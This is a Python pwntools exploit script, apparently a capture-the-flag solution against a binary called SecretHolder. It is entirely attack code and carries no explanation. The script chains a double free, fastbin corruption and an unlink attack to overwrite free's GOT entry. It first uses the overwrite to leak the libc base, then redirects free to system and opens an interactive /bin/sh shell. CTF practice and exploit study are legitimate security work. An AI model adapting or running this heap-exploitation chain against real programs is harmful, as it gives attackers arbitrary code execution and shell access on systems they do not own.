#!/usr/bin/env python
from pwn import *

def keep(size,data):
    s.recvuntil('3. Renew secret\n')
    s.send('1')
    s.recvuntil('3. Huge secret\n')
    s.send(str(size))
    s.recvuntil('Tell me your secret: \n')
    s.send(data)

def wipe(size):
    s.recvuntil('3. Renew secret\n')
    s.send('2')
    s.recvuntil('3. Huge secret\n')
    s.send(str(size))

def renew(size,data):
    s.recvuntil('3. Renew secret\n')
    s.send('3')
    s.recvuntil('3. Huge secret\n')
    s.send(str(size))
    s.recvuntil('Tell me your secret: \n')
    s.send(data)

if __name__ == '__main__':
    big_secret = 0x6020a0
    huge_secret = 0x6020a8
    small_secret = 0x6020b0
    free_got = 0x602018
    puts_plt = 0x4006c0
    system_offset = 0x45390

    s = process('./SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8')

    # double free
    keep(3,'A'*16)
    wipe(3)
    keep(2,'A'*16)
    wipe(2)
    keep(3,'A'*16)
    wipe(2)

    # fastbins
    keep(1,'A'*16)
    keep(2,'A'*16)
    renew(3,'A'*0x28 + p64(0x31) + 'B'*0x28 + p64(0x21))
    wipe(1)
    wipe(2)
    keep(1,'A'*16)
    keep(2,'A'*16)

    # unlink attack
    payload = ''
    payload += 'A' * 0x28
    payload += p64(0xfc1)
    payload += 'B' * (0xfc0 - 0x10)
    payload += p64(0xfc0)
    payload += p64(0xfb1)
    payload += p64(big_secret - 0x18)
    payload += p64(big_secret - 0x10)
    payload += '\0' * (0xfb0 - 0x20)
    payload += p64(0xfb0)
    payload += p64(0x20)
    renew(3,payload)
    wipe(1)

    # got overwrite
    renew(2,'A' * 0x18 + p64(huge_secret))
    renew(2,p64(free_got))
    renew(3,p64(puts_plt))
    wipe(1)
    libc_base = u64(s.recvline(False).ljust(8,'\0')) - 0x3c4b78
    print '[*] libc base is', hex(libc_base)
    renew(2,p64(free_got))
    renew(3,p64(libc_base + system_offset))
    renew(2,'/bin/sh\x00')
    wipe(2)
    s.interactive()
